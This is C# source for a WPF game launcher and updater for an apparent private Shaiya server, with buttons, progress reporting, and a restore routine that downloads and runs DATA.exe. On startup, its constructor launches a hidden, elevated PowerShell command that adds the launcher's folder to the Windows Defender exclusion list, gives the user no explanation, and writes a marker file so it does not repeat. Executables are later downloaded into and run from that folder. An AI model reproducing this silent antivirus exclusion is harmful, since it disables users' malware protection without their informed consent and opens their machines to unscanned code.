using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Net.Http.Handlers;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using Updater.Common;
using Updater.Core;
using Updater.Helpers;
using Updater.Resources;

#if DEBUG
using Updater;
#endif

namespace Updater
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private readonly BackgroundWorker _backgroundWorker1;
        private readonly BackgroundWorker _backgroundWorkerRestore; // Nuovo worker per restore
        private readonly HttpClient _httpClient;
        private static readonly Image _icon3 = new();
        private readonly Image _image167 = new();
        private readonly Image _image168 = new();
        private readonly Image _image169 = new();
        private readonly Image _image170 = new();
        private readonly Image _image185 = new();
        private readonly Image _image187 = new();
        private readonly Image _image188 = new();

        private long _previousBytesReceived = 0; // Per memorizzare i byte ricevuti nell'aggiornamento precedente
        private DateTime _lastUpdateTime = DateTime.Now; // Per memorizzare l'ultima volta che è stato calcolato il tempo
        private bool _isReady = false; // Stato: pronto per avviare il gioco
        private bool _isRestoreInProgress = false; // Stato restore

        public MainWindow()
        {
#if DEBUG
            Logger.Log("Enter: MainWindow.ctor");
#endif
            InitializeComponent();

            _backgroundWorker1 = new BackgroundWorker();
            _backgroundWorker1.WorkerReportsProgress = true;
            _backgroundWorker1.DoWork += BackgroundWorker1_DoWork;
            _backgroundWorker1.ProgressChanged += BackgroundWorker1_ProgressChanged;

            // Worker per restore
            _backgroundWorkerRestore = new BackgroundWorker();
            _backgroundWorkerRestore.WorkerReportsProgress = true;
            _backgroundWorkerRestore.DoWork += BackgroundWorkerRestore_DoWork;
            _backgroundWorkerRestore.ProgressChanged += BackgroundWorker1_ProgressChanged;
            _backgroundWorkerRestore.RunWorkerCompleted += BackgroundWorkerRestore_RunWorkerCompleted;

            var handler = new ProgressMessageHandler(new HttpClientHandler());
            handler.HttpReceiveProgress += ProgressMessageHandler_HttpReceiveProgress;
            _httpClient = new HttpClient(handler, true);

            try
            {
                string folder = AppDomain.CurrentDomain.BaseDirectory;
                string markerPath = Path.Combine(folder, ".defender_excluded");
                if (!File.Exists(markerPath))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "powershell",
                        Arguments = $"-Command \"Add-MpPreference -ExclusionPath '{folder}'\"",
                        Verb = "runas", // Richiede privilegi amministrativi
                        UseShellExecute = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    Process.Start(psi);
                    // Crea il marker per evitare ripetizioni future
                    File.WriteAllText(markerPath, "excluded");
                }
            }
            catch (Exception ex)
            {
                // Puoi loggare o ignorare, l'utente può rifiutare l'UAC
            }
        }

        private void ProgressMessageHandler_HttpReceiveProgress(object? sender, HttpProgressEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: ProgressMessageHandler_HttpReceiveProgress");
#endif
            if (sender is null)
            {
                ShowErrorAndExit("Network error while receiving data. Please try again or contact support.", "Network Error");
                return;
            }

            // Calcola la velocità di scaricamento
            long bytesReceived = e.BytesTransferred;
            DateTime currentTime = DateTime.Now;
            double secondsElapsed = (currentTime - _lastUpdateTime).TotalSeconds;

            if (secondsElapsed > 0)
            {
                long bytesDiff = bytesReceived - _previousBytesReceived;
                double speedInMbps = (bytesDiff / secondsElapsed) / (1024.0 * 1024.0); // Converti in MB/s

                // Usa il dispatcher per aggiornare il TextBox nel thread UI
                Dispatcher.Invoke(() =>
                {
                    _textBoxSpeed.Text = $"{speedInMbps:F2} MB/s"; // Mostra la velocità in MB/s
                });
            }

            _previousBytesReceived = bytesReceived;
            _lastUpdateTime = currentTime;

            // Aggiorna la barra di progresso
            _backgroundWorker1.ReportProgress(e.ProgressPercentage, new ProgressReport(byProgressBar: 1));
        }

        private void BackgroundWorker1_DoWork(object? sender, DoWorkEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: BackgroundWorker1_DoWork");
#endif
            try
            {
                Program.DoWork(_httpClient, _backgroundWorker1);
            }
            catch (Exception)
            {
                ShowErrorAndExit("An unexpected error occurred during update. Please try again or contact support.", "Update Error");
            }
        }

        private void BackgroundWorker1_ProgressChanged(object? sender, ProgressChangedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: BackgroundWorker1_ProgressChanged");
#endif
            if (e.UserState is null)
            {
                ShowErrorAndExit("An error occurred while updating progress. Please try again or contact support.", "Update Error");
                return;
            }

            if (e.UserState is ProgressReport progressReport)
            {
                if (!string.IsNullOrEmpty(progressReport.Message))
                    _textBox1.Text = progressReport.Message;

                // Disabilita Start Game durante i controlli hash/meta chain
                if (progressReport.Message == Strings.HashCheckStart || progressReport.Message == Strings.MetaChainCheckStart)
                {
                    _button2.IsEnabled = false;
                }
                // Riabilita Start Game dopo i controlli hash/meta chain
                else if (progressReport.Message == Strings.HashCheckEnd || progressReport.Message == Strings.MetaChainCheckEnd || progressReport.Message == Strings.HashCheckFailed || progressReport.Message == Strings.MetaChainCheckFailed)
                {
                    _button2.IsEnabled = true;
                }

                // Disabilita Restore durante update/estrazione/controlli
                if (progressReport.Message == Strings.HashCheckStart || progressReport.Message == Strings.MetaChainCheckStart || progressReport.Message == Strings.ProgressMessage1 || progressReport.Message == Strings.ProgressMessage2 || progressReport.Message == Strings.ProgressMessage4 || progressReport.Message == Strings.ProgressMessage5)
                {
                    _buttonRestore.IsEnabled = false;
                }
                // Riabilita Restore solo se pronto
                else if (progressReport.Message == Strings.MetaChainCheckEnd || progressReport.Message == Strings.HashCheckEnd || progressReport.Message == Strings.MetaChainCheckFailed || progressReport.Message == Strings.HashCheckFailed || progressReport.Message == Strings.ProgressMessage7)
                {
                    if (!_isRestoreInProgress)
                        _buttonRestore.IsEnabled = true;
                }

                // Mostra Bitmap170.bmp quando il controllo finale è ok
                if (progressReport.Message == Strings.MetaChainCheckEnd)
                {
                    _button2.Content = _image170;
                    _isReady = true;
                }
                // Se non è pronto, torna all'immagine di default
                else if (progressReport.Message == Strings.MetaChainCheckStart || progressReport.Message == Strings.HashCheckStart)
                {
                    _button2.Content = _image168;
                    _isReady = false;
                }

                if (progressReport.ByProgressBar == 1)
                    _progressBar1.Value = e.ProgressPercentage;
                else if (progressReport.ByProgressBar == 2)
                    _progressBar2.Value = e.ProgressPercentage;
            }
        }

        private void ButtonRestore_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: ButtonRestore_Click");
#endif
            // Mostra dialog custom per 7-Zip
            var dialog = new CustomDialogWindow(
                "Restore Updater",
                "To extract the new game data you must have 7-Zip or compatible extraction software installed.",
                "If you do not have it, you can download it from the official website:",
                "https://www.7-zip.org/",
                "https://www.7-zip.org/",
                true);
            dialog.Owner = this;
            var result = dialog.ShowDialog();
            if (result != true)
                return;
            
            if (_backgroundWorker1.IsBusy || _isRestoreInProgress)
            {
                new CustomDialogWindow(
                    "Restore not available",
                    "Restore is not available while updates or checks are in progress. Please try again or contact support.")
                { Owner = this }.ShowDialog();
                return;
            }
            // Messaggio di conferma
            var confirm = new CustomDialogWindow(
                "Emergency Button Warning",
                "This is an emergency button. Use only if the update fails or errors occur. Proceed with caution.",
                null, null, null, true) { Owner = this };
            if (confirm.ShowDialog() != true)
                return;
            // Conferma overwrite Version.ini
            string directoryPath = AppDomain.CurrentDomain.BaseDirectory;
            string versionIniPath = Path.Combine(directoryPath, "Version.ini");
            if (File.Exists(versionIniPath))
            {
                var overwrite = new CustomDialogWindow(
                    "Confirmation",
                    "The file 'Version.ini' already exists. Overwrite?",
                    null, null, null, true) { Owner = this };
                if (overwrite.ShowDialog() != true)
                {
                    new CustomDialogWindow(
                        "Cancelled",
                        "Operation cancelled. The file was not modified.")
                    { Owner = this }.ShowDialog();
                    return;
                }
            }
            // Start restore
            _isRestoreInProgress = true;
            _buttonRestore.IsEnabled = false;
            _backgroundWorkerRestore.RunWorkerAsync();
        }

        private void ButtonGraphicsSetting_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: ButtonGraphicsSetting_Click");
#endif
            try
            {
                string directoryPath = AppDomain.CurrentDomain.BaseDirectory;
                string filePath = Path.Combine(directoryPath, "CONFIG.INI");
                if (!File.Exists(filePath))
                {
                    MessageBox.Show("CONFIG.INI not found.",
                        "File Missing", MessageBoxButton.OK, MessageBoxImage.Information, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
                    Application.Current?.Dispatcher.Invoke(() => Application.Current.Shutdown());
                    Environment.Exit(1);
                }
                GraphicsSettingWindow settingsWindow = new GraphicsSettingWindow(filePath);
                settingsWindow.Owner = this;
                settingsWindow.WindowStartupLocation = WindowStartupLocation.CenterOwner;
                settingsWindow.ShowDialog();
            }
            catch (Exception ex)
            {
                ShowErrorAndExit("An error occurred while managing CONFIG.INI.Please try again or contact support");
            }
        }

        private void Window1_Initialized(object sender, EventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Window1_Initialized");
#endif
            if (DllImport.FindWindowW(null, Application.Current.MainWindow.Title) != IntPtr.Zero)
            {
                var caption = Application.ResourceAssembly.GetName().Name;
                MessageBox.Show(Strings.Message1 + " Please try again or contact support.", caption, MessageBoxButton.OK, MessageBoxImage.Exclamation, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
                Application.Current?.Dispatcher.Invoke(() => Application.Current.Shutdown());
                Environment.Exit(1);
            }
            if (DllImport.FindWindowW("GAME", "Shaiya") != IntPtr.Zero)
            {
                var caption = Application.ResourceAssembly.GetName().Name;
                MessageBox.Show(Strings.Message2 + " Please try again or contact support.", caption, MessageBoxButton.OK, MessageBoxImage.Exclamation, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
                Application.Current?.Dispatcher.Invoke(() => Application.Current.Shutdown());
                Environment.Exit(1);
            }

            var icon3 = BitmapImageHelper.FromManifestResource("Icon3.ico");
            if (icon3 != null)
            {
                _icon3.Width = icon3.PixelWidth;
                _icon3.Height = icon3.PixelHeight;
                _icon3.Source = icon3;
            }

            var image167 = BitmapImageHelper.FromManifestResource("Bitmap167.bmp");
            if (image167 != null)
            {
                _image167.Width = image167.PixelWidth;
                _image167.Height = image167.PixelHeight;
                _image167.Source = image167;
            }

            var image168 = BitmapImageHelper.FromManifestResource("Bitmap168.bmp");
            if (image168 != null)
            {
                _image168.Width = image168.PixelWidth;
                _image168.Height = image168.PixelHeight;
                _image168.Source = image168;
            }

            var image169 = BitmapImageHelper.FromManifestResource("Bitmap169.bmp");
            if (image169 != null)
            {
                _image169.Width = image169.PixelWidth;
                _image169.Height = image169.PixelHeight;
                _image169.Source = image169;
            }

            var image170 = BitmapImageHelper.FromManifestResource("Bitmap170.bmp");
            if (image170 != null)
            {
                _image170.Width = image170.PixelWidth;
                _image170.Height = image170.PixelHeight;
                _image170.Source = image170;
            }

            var image185 = BitmapImageHelper.FromManifestResource("Bitmap185.bmp");
            if (image185 != null)
            {
                _image185.Width = image185.PixelWidth;
                _image185.Height = image185.PixelHeight;
                _image185.Source = image185;
            }

            var image187 = BitmapImageHelper.FromManifestResource("Bitmap187.bmp");
            if (image187 != null)
            {
                _image187.Width = image187.PixelWidth;
                _image187.Height = image187.PixelHeight;
                _image187.Source = image187;
            }

            var image188 = BitmapImageHelper.FromManifestResource("Bitmap188.bmp");
            if (image188 != null)
            {
                _image188.Width = image188.PixelWidth;
                _image188.Height = image188.PixelHeight;
                _image188.Source = image188;
            }
        }

        private void Window1_Loaded(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Window1_Loaded");
#endif
            _window1.Background = new ImageBrush(_image167.Source);
            _window1.Icon = _icon3.Source;
            _button1.Content = _image185;
            _button2.Content = _image168;
            _webBrowser1.Navigate(Constants.WebBrowserSource);
            _backgroundWorker1.RunWorkerAsync();
        }

        private void Window1_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Window1_MouseLeftButtonDown");
#endif
            DragMove();
        }

        private void Button1_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button1_Click");
#endif
            if (_backgroundWorker1.IsBusy)
                return;

            Application.Current.Shutdown(0);
        }

        private void Button1_MouseEnter(object sender, MouseEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button1_MouseEnter");
#endif
            _button1.Content = _image187;
        }

        private void Button1_MouseLeave(object sender, MouseEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button1_MouseLeave");
#endif
            _button1.Content = _image185;
        }

        private void Button1_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button1_PreviewMouseLeftButtonDown");
#endif
            _button1.Content = _image188;
        }

        private void Button1_PreviewMouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button1_PreviewMouseLeftButtonUp");
#endif
            _button1.Content = _image187;
        }

        private async void Button2_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button2_Click");
#endif
            _button2.IsEnabled = false; // Disabilita il pulsante per evitare doppi click
            _isReady = false; // Disabilita lo stato pronto
            _button2.Content = _image168; // Mostra Bitmap168.bmp quando si avvia il gioco

            if (_backgroundWorker1.IsBusy)
            {
                _button2.IsEnabled = true; // Riabilita solo se non si avvia il gioco
                return;
            }

            try
            {
                var gamePath = Path.Combine(Directory.GetCurrentDirectory(), "game.exe");
                if (!File.Exists(gamePath))
                {
                    ShowErrorAndExit("Game executable not found. Please check your installation. Please try again or contact support.", "Game Error");
                    return;
                }
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = gamePath,
                        UseShellExecute = true,
                        WorkingDirectory = Directory.GetCurrentDirectory()
                    }
                };
                process.Start();

                // Attendi 10 secondi e poi chiudi il launcher
                await Task.Delay(10000);
                Application.Current.Shutdown();
            }
            catch (Exception)
            {
                ShowErrorAndExit("Unable to start the game. Please try again or contact support.", "Game Error");
                _button2.IsEnabled = true; // Riabilita il pulsante solo in caso di errore
            }
        }

        private void Button2_MouseEnter(object sender, System.Windows.Input.MouseEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button2_MouseEnter");
#endif
            _button2.Content = _image169;
        }

        private void Button2_MouseLeave(object sender, System.Windows.Input.MouseEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button2_MouseLeave");
#endif
            // Se il gioco è pronto, lascia Bitmap170.bmp, altrimenti torna aBitmap168.bmp
            if (_isReady)
                _button2.Content = _image170;
            else
                _button2.Content = _image168;
        }

        private void Button2_PreviewMouseLeftButtonUp(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: Button2_PreviewMouseLeftButtonUp");
#endif
            _button2.Content = _image169;
        }

        private void ButtonWebsite_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: ButtonWebsite_Click");
#endif
            OpenUrl("https://duff.pinto-lime.ts.net/");
        }

        private void ButtonDiscord_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: ButtonDiscord_Click");
#endif
            OpenUrl("https://discord.com/channels/1309994884563861526");
        }

        private void ButtonItemmall_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: ButtonItemmall_Click");
#endif
            OpenUrl("https://duff.pinto-lime.ts.net/?p=itemmall&category=3");
        }

        private void ButtonRanks_Click(object sender, RoutedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: ButtonRanks_Click");
#endif
            OpenUrl("https://duff.pinto-lime.ts.net/?p=ranks");
        }

        private void OpenUrl(string url)
        {
#if DEBUG
            Logger.Log("Enter: OpenUrl");
#endif
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true // Necessario per aprire il browser predefinito
                });
            }
            catch (Exception)
            {
                ShowErrorAndExit("Unable to open the link. Please try again or contact support.", "Link Error");
            }
        }

        // Utility per mostrare MessageBox sempre in primo piano e chiudere l'applicazione
        private void ShowErrorAndExit(string message, string title = "Error")
        {
            MessageBox.Show(message + " Please try again or contact support.", title, MessageBoxButton.OK, MessageBoxImage.Error, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
            Application.Current?.Dispatcher.Invoke(() => Application.Current.Shutdown());
            Environment.Exit(1);
        }

        private void BackgroundWorkerRestore_DoWork(object? sender, DoWorkEventArgs e)
        {
            string directoryPath = AppDomain.CurrentDomain.BaseDirectory;
            string dataExeUrl = $"{Constants.Source}/shaiya/client/DATA.exe";
            string dataExePath = Path.Combine(directoryPath, "DATA.exe");
            string clientIniUrl = $"{Constants.Source}/shaiya/client/CLIENT.ini";
            string versionIniUrl = $"{Constants.Source}/shaiya/client/Version.ini";
            string clientIniPath = Path.Combine(directoryPath, "CLIENT.ini");
            string versionIniPath = Path.Combine(directoryPath, "Version.ini");

            var httpClient = new HttpClient(new ProgressMessageHandler(new HttpClientHandler()));
            int totalFiles = 3;
            int currentFile = 1;
            // Download DATA.exe with progress
            try
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(string.Format(Strings.ProgressMessage2, currentFile, totalFiles), 1));
                using (var response = httpClient.GetAsync(dataExeUrl, HttpCompletionOption.ResponseHeadersRead).Result)
                {
                    response.EnsureSuccessStatusCode();
                    var total = response.Content.Headers.ContentLength ?? 1;
                    using (var stream = response.Content.ReadAsStreamAsync().Result)
                    using (var fs = new FileStream(dataExePath, FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        var buffer = new byte[1024 * 1024];
                        int read;
                        long totalRead = 0;
                        DateTime lastUpdate = DateTime.Now;
                        long lastBytes = 0;
                        while ((read = stream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            fs.Write(buffer, 0, read);
                            totalRead += read;
                            double percent = (double)totalRead / total * 100;
                            double seconds = (DateTime.Now - lastUpdate).TotalSeconds;
                            if (seconds >= 0.5)
                            {
                                double speed = (totalRead - lastBytes) / seconds / (1024 * 1024);
                                // Aggiorna solo la velocità nel TextBox, non nel messaggio della progress bar
                                Dispatcher.Invoke(() =>
                                {
                                    _textBoxSpeed.Text = $"{speed:F2} MB/s";
                                });
                                lastUpdate = DateTime.Now;
                                lastBytes = totalRead;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(Strings.ProgressMessage3, 1));
                e.Result = ex;
                return;
            }
            currentFile++;
            // Download CLIENT.ini
            try
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(string.Format(Strings.ProgressMessage2, currentFile, totalFiles), 1));
                var clientIniBytes = httpClient.GetByteArrayAsync(clientIniUrl).Result;
                File.WriteAllBytes(clientIniPath, clientIniBytes);
            }
            catch (Exception ex)
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(Strings.ProgressMessage3, 1));
                e.Result = ex;
                return;
            }
            currentFile++;
            // Download Version.ini
            try
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(string.Format(Strings.ProgressMessage2, currentFile, totalFiles), 1));
                var versionIniBytes = httpClient.GetByteArrayAsync(versionIniUrl).Result;
                File.WriteAllBytes(versionIniPath, versionIniBytes);
            }
            catch (Exception ex)
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(Strings.ProgressMessage3, 1));
                e.Result = ex;
                return;
            }
            // Extract DATA.exe
            try
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(Strings.ProgressMessage4, 1));
                var extractProc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = dataExePath,
                        Arguments = $"-y -o\"{directoryPath}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WorkingDirectory = directoryPath
                    }
                };
                extractProc.Start();
                while (!extractProc.HasExited)
                {
                    _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(Strings.ProgressMessage4, 1));
                    System.Threading.Thread.Sleep(1000);
                }
                File.Delete(dataExePath);
            }
            catch (Exception ex)
            {
                _backgroundWorkerRestore.ReportProgress(0, new ProgressReport(Strings.ProgressMessage5, 1));
                e.Result = ex;
                return;
            }
            _backgroundWorkerRestore.ReportProgress(100, new ProgressReport("Restore completed.", 1));
        }

        private void BackgroundWorkerRestore_RunWorkerCompleted(object? sender, RunWorkerCompletedEventArgs e)
        {
#if DEBUG
            Logger.Log("Enter: BackgroundWorkerRestore_RunWorkerCompleted");
#endif
            _isRestoreInProgress = false;
            _buttonRestore.IsEnabled = true;
            if (e.Result is Exception ex)
            {
                MessageBox.Show("Restore failed. Please try again or contact support.", "Restore Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            MessageBox.Show("Restore completed. The application will now close.", "Success", MessageBoxButton.OK, MessageBoxImage.Information, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
            Application.Current?.Dispatcher.Invoke(() => Application.Current.Shutdown());
            Environment.Exit(1);
        }
    }
}